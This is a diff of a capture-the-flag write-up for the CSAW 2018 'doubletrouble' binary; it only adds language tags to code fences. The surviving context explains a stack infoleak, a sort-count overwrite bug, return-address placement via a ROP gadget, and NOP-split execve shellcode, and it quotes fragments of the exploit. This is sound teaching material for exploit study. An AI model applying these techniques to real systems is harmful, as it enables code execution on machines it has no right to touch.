@@ -5,7 +5,7 @@ https://www.youtube.com/watch?v=wHbpWtMOJTI
 
 Let's take a look at the binary:
 
-```
+```console
 $ ./doubletrouble 
 0xff930988
 How long: 5
@@ -43,7 +43,7 @@ doubletrouble: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamic
 
 So we can see a couple of things. It appears to prompt us for a number of inputs, then it takes in those inputs and converts them to doubles. Proceeding that it does some arithmetic on those doubles, then sorts the doubles least to greatest. We can also see that we get what looks like to be a stack infoleak, but we confirm that it is a stack infoleak with gdb:
 
-```
+```gdb
 gdb-peda$ r
 Starting program: /Hackery/csaw18/pwn/doubletrouble/doubletrouble 
 0xffffcd68
@@ -77,7 +77,7 @@ here we can see that the infoleak is from the stack (which starts at `0xfffdd000
 
 So starting off we have the main function (which we use Ghidra to decompile):
 
-```
+```c
 /* WARNING: Type propagation algorithm not settling */
 
 undefined4 main(void)
@@ -94,7 +94,7 @@ undefined4 main(void)
 
 From our perspective, the only thing we need to worry about here is that it calls `game()` which we can see here:
 
-```
+```c
 int game()
 {
   int index; // esi@5
@@ -151,7 +151,7 @@ So we can see how this game goes down. It first starts by printing the address o
 
 Looking at the `sumArray`, `maxArray`, and `minArray` functions, they do pretty much what we would expect them to do. However when we get to `findArray`, that's when we see something interesting:
 
-```
+```text
 int __cdecl findArray(int *heapQt, int ptrArray, double a3, double a4)
 {
   int v5; // [sp+1Ch] [bp-4h]@1
@@ -174,13 +174,13 @@ int __cdecl findArray(int *heapQt, int ptrArray, double a3, double a4)
 
 Particularly this line is interesting:
 
-```
+```text
   *heapQt = v5;
 ```
 
 This dereferences a ptr to `heapQt` and writes a value to it. This is interesting to us, since it will allow us to change the value of `heapQt`, which is then passed as an argument to `sortArray`. Looking at the condition (since `a3` is `-10` and `a4` is `-100`), it appears that a value between `-10` and `-100` will trigger the write (I used `-23`). The write appears to increase the value of `heapQt`. Next up we have the `sortArray` function:
 
-```
+```text
 signed int __cdecl sortArray(_DWORD *heapQt, int ptrArray)
 {
   double v2; // ST08_8@4
@@ -210,7 +210,7 @@ So looking at this function, we can see that it essentially will loop through th
 
 So we have a bug, where we can overwrite the number of doubles which is sorted in `sortArray`. We also have a stack infoleak, an executable stack, and the ability to write data to the stack. And looking at the stack layout in IDA, we see that `16` bytes after our double array is the return address:
 
-```
+```nasm
 -00000210 ptrArray        dq 64 dup(?)
 -00000010                 db ? ; undefined
 -0000000F                 db ? ; undefined
@@ -231,7 +231,7 @@ So we have a bug, where we can overwrite the number of doubles which is sorted i
 
 Essentially what we will do is, we will write a greater value to `heapQt` than `64`, that way it will start sorting data past `ptrArray`. Specifically, we will get it to place an address that we want where the return address is stored at `ebp+0x4`, which will give us code execution. We will also need to make sure the sorting algorithm leaves the stack canary in the same place, otherwise the binary will crash before we get code execution.
 
-```
+```gdb
 gdb-peda$ x/152x 0xff8969b8
 0xff8969b8: 0x00000000  0xff820d84  0x00000000  0xff820d84
 0xff8969c8: 0x00000000  0xff820d84  0x00000000  0xff820d84
@@ -285,7 +285,7 @@ gdb-peda$ x/x $ebp-0xc
 
 So we can see here, an example memory layout of the stack prior to the sorting. We can see that the return address is at `0xff896bcc` (which is `0x8049841`) and the stack canary is at `0xff896bbc` (which is `0x1d781100`). In this instance, my input ends at `0xff896bb4` with `0x0804900a00000000`. Keep in mind, that when evaluating the doubles (which are `8` bytes in memory) the last `4` bytes are stored first, which are followed by the first `4` bytes. For instance. 
  
-```
+```gdb
  gdb-peda$ p/f 0x0804900a00000000
  $1 = 4.8653382194983783e-270
 gdb-peda$ p/f 0xff820d8400000000
@@ -300,7 +300,7 @@ Now to get the return address overwritten, what we can do is we can make the val
 
 Proceeding that, we will include three floats which their hex value begins with `0x804`. They will all be less than the value `0x8049841` when converted to a float. The reason for this being, that they should be greater than all values other than the return address (`0x8049841`) which is the same every time, so it will occupy the value before, after, and the same as the return address. Now because the value we have in the return address has to start with `0x804` and be less than `0x8049841`, this limits us to what we can call to certain sections of the code, such as certain ROP gadgets. However we find one that meets our needs:
 
-```
+```text
 ROPgadget --binary doubletrouble | grep 804900a
 0x0804900a : ret
 ```
@@ -314,7 +314,7 @@ The last thing we need to worry about is our shellcode, since we will need to kn
 However when we insert the NOPs into our shellcode, we will have to rewrite/recompile the shellcode. The reason for this, is because if we just insert NOPs into random places, there is a good chance we will insert a NOP in the middle of an instruction, which will change what the instruction does. Also note, the base shellcode I did not write. I grabbed it from `http://shell-storm.org/shellcode/files/shellcode-599.php` and modified it. Also I found that this website which is an online x86/x64 decompiler/compiler helped `https://defuse.ca/online-x86-assembler.htm`:
 
 here is the shellcode before we modified it:
-```
+```objdump
 0:  6a 17                   push   0x17
 2:  58                      pop    eax
 3:  31 db                   xor    ebx,ebx
@@ -331,7 +331,7 @@ d:  68 2f 62 69 6e          push   0x6e69622f
 
 This shellcode is `27` bytes. After we figure out how to split the individual commands up with `\x90`s in a way that the instructions will still execute properly, and after the sorting the shellcode will be in the proper order, we get the following segments:
 
-```
+```text
 0x9101eb51e1f7c931:
 
 0x90909068732f2f68:
@@ -343,7 +343,7 @@ This shellcode is `27` bytes. After we figure out how to split the individual co
 
 keep in mind, because of how the data is stored, the last four bytes will be executed first. After a lot of trial and error, we see that this is our shellcode:
 
-```
+```gdb
 gdb-peda$ x/16i 0xffff7ca0
    0xffff7ca0: xor    ecx,ecx
    0xffff7ca2: mul    ecx
@@ -368,7 +368,7 @@ Also to find the offset from the infoleak to where our shellcode is, we can just
 ## tl ; dr
 
 A quick overview of this challenge
-```
+```nasm
 *  Program scans in up to 64 doubles, and sorts them from smallest to largest
 *  Bug in `findArray` allows us to overwrite the float count with a larger value, thus when it sorts the doubles, it will sort values past our input, allowing us to move the return address.
 *  Format payload to call rop gadget, then shellcode on the stack using stack infoleak. The canary has to be within a set range. 
@@ -378,7 +378,7 @@ A quick overview of this challenge
 ## Exploit
 
 putting it all together, we get the following exploit:
-```
+```python
 # Import the libraries
 from pwn import *
 import struct
@@ -462,7 +462,7 @@ target.interactive()
 
 we have to run the exploit several times before it works (due to the fact that we need the first byte of the canary to be in a certain range). But once it is, we get this:
 
-```
+```console
 $  python exploit.py 
 [+] Opening connection to pwn.chal.csaw.io on port 9002: Done
 [*] Switching to interactive mode
